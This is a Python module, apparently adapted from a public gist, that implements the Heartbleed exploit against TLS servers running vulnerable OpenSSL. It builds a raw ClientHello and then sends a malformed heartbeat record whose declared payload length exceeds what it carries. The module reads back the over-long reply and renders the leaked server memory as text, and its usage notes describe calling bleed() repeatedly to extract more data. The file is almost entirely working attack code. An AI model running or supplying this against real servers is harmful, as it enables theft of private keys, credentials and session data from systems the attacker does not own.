"""
Heartbleeder module
Original code: https://gist.github.com/eelsivart/10174134

Usage:
  - use connect() to connect to a server
  - then use send_hello() to send a ClientHello (should be executed once)
  - then use bleed() to send a Heartbeat request
  - you can wait and send bleed() again if you want to get more data

TLS versions: 0x01 = 1.0, 0x02 = 1.1, 0x03 = 1.2
"""

import codecs
import random
import sys
import struct
import socket
import re
import time
from typing import Iterable, List, Tuple, Optional

#
decode_hex = codecs.getdecoder("hex_codec")


def _hex2bin(arr: Iterable[int]) -> bytes:
    return bytes.fromhex("".join("{:02x}".format(x) for x in arr))


def _build_client_hello(tls_ver: int = 0x01) -> List[int]:
    return [
        # TLS header ( 5 bytes)
        0x16,  # Content type (0x16 for handshake)
        0x03,
        tls_ver,  # TLS Version
        0x00,
        0xDC,  # Length
        # Handshake header
        0x01,  # Type (0x01 for ClientHello)
        0x00,
        0x00,
        0xD8,  # Length
        0x03,
        tls_ver,  # TLS Version
        # Random (32 byte)
        0x53,
        0x43,
        0x5B,
        0x90,
        0x9D,
        0x9B,
        0x72,
        0x0B,
        0xBC,
        0x0C,
        0xBC,
        0x2B,
        0x92,
        0xA8,
        0x48,
        0x97,
        0xCF,
        0xBD,
        0x39,
        0x04,
        0xCC,
        0x16,
        0x0A,
        0x85,
        0x03,
        0x90,
        0x9F,
        0x77,
        0x04,
        0x33,
        0xD4,
        0xDE,
        0x00,  # Session ID length
        0x00,
        0x66,  # Cipher suites length
        # Cipher suites (51 suites)
        0xC0,
        0x14,
        0xC0,
        0x0A,
        0xC0,
        0x22,
        0xC0,
        0x21,
        0x00,
        0x39,
        0x00,
        0x38,
        0x00,
        0x88,
        0x00,
        0x87,
        0xC0,
        0x0F,
        0xC0,
        0x05,
        0x00,
        0x35,
        0x00,
        0x84,
        0xC0,
        0x12,
        0xC0,
        0x08,
        0xC0,
        0x1C,
        0xC0,
        0x1B,
        0x00,
        0x16,
        0x00,
        0x13,
        0xC0,
        0x0D,
        0xC0,
        0x03,
        0x00,
        0x0A,
        0xC0,
        0x13,
        0xC0,
        0x09,
        0xC0,
        0x1F,
        0xC0,
        0x1E,
        0x00,
        0x33,
        0x00,
        0x32,
        0x00,
        0x9A,
        0x00,
        0x99,
        0x00,
        0x45,
        0x00,
        0x44,
        0xC0,
        0x0E,
        0xC0,
        0x04,
        0x00,
        0x2F,
        0x00,
        0x96,
        0x00,
        0x41,
        0xC0,
        0x11,
        0xC0,
        0x07,
        0xC0,
        0x0C,
        0xC0,
        0x02,
        0x00,
        0x05,
        0x00,
        0x04,
        0x00,
        0x15,
        0x00,
        0x12,
        0x00,
        0x09,
        0x00,
        0x14,
        0x00,
        0x11,
        0x00,
        0x08,
        0x00,
        0x06,
        0x00,
        0x03,
        0x00,
        0xFF,
        0x01,  # Compression methods length
        0x00,  # Compression method (0x00 for NULL)
        0x00,
        0x49,  # Extensions length
        # Extension: ec_point_formats
        0x00,
        0x0B,
        0x00,
        0x04,
        0x03,
        0x00,
        0x01,
        0x02,
        # Extension: elliptic_curves
        0x00,
        0x0A,
        0x00,
        0x34,
        0x00,
        0x32,
        0x00,
        0x0E,
        0x00,
        0x0D,
        0x00,
        0x19,
        0x00,
        0x0B,
        0x00,
        0x0C,
        0x00,
        0x18,
        0x00,
        0x09,
        0x00,
        0x0A,
        0x00,
        0x16,
        0x00,
        0x17,
        0x00,
        0x08,
        0x00,
        0x06,
        0x00,
        0x07,
        0x00,
        0x14,
        0x00,
        0x15,
        0x00,
        0x04,
        0x00,
        0x05,
        0x00,
        0x12,
        0x00,
        0x13,
        0x00,
        0x01,
        0x00,
        0x02,
        0x00,
        0x03,
        0x00,
        0x0F,
        0x00,
        0x10,
        0x00,
        0x11,
        # Extension: SessionTicket TLS
        0x00,
        0x23,
        0x00,
        0x00,
        # Extension: Heartbeat
        0x00,
        0x0F,
        0x00,
        0x01,
        0x01,
    ]


def _build_heartbeat(tls_ver: int = 0x01) -> List[int]:
    return [
        0x18,  # Content Type (Heartbeat)
        0x03,
        tls_ver,  # TLS version
        0x00,
        0x03,  # Length
        # Payload
        0x01,  # Type (Request)
        0x40,
        0x00,  # Payload length
    ]


def _hexdump(payload: bytes) -> str:
    pdat = ""
    for b in range(0, len(payload), 16):
        lin = [c for c in payload[b : b + 16]]
        pdat += "".join(
            (chr(c) if ((32 <= c <= 126) or (c == 10) or (c == 13)) else ".")
            for c in lin
        )
    pdat = re.sub(r"([.]{50,})", "", pdat)
    return pdat


def _rcv_tls_record(connection: socket.socket) -> Optional[Tuple[int, int, bytes]]:
    try:
        tls_header = connection.recv(5)
        if not tls_header:
            print("Unexpected EOF (header)")
            return None
        typ, ver, length = struct.unpack(">BHH", tls_header)
        message = b""
        while True:
            received = connection.recv(length - len(message))
            if not received:
                break
            message += received
        if not message:
            print("Unexpected EOF (message)")
            return None
        return typ, ver, message
    except Exception as e:
        print("\nError Receiving Record! " + str(e))
        return None


def bleed(connection: socket.socket, tls_ver: int = 0x01) -> Optional[str]:
    connection.send(_hex2bin(_build_heartbeat(tls_ver)))
    time.sleep(1)
    while True:
        result = _rcv_tls_record(connection)
        if result is None:
            print("No heartbeat response received, server likely not vulnerable")
            return None
        else:
            typ, ver, pay = result

        if typ == 24:
            if len(pay) > 3:
                return _hexdump(pay)
            else:
                print(
                    "Server processed malformed heartbeat, but did not return any extra data."
                )


def connect(dst_address: str, dst_port: int, src_port: int = None) -> socket.socket:
    try:
        src_port = src_port or random.randint(50000, 60000)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sys.stdout.flush()
        s.settimeout(30)
        time.sleep(0.2)
        s.bind(("0.0.0.0", src_port))
        s.connect((dst_address, dst_port))
        return s

    except Exception as e:
        print("Connection Error! " + str(e))
        raise


def send_hello(connection: socket.socket, tls_ver: int = 0x01) -> None:
    connection.send(_hex2bin(_build_client_hello(tls_ver)))
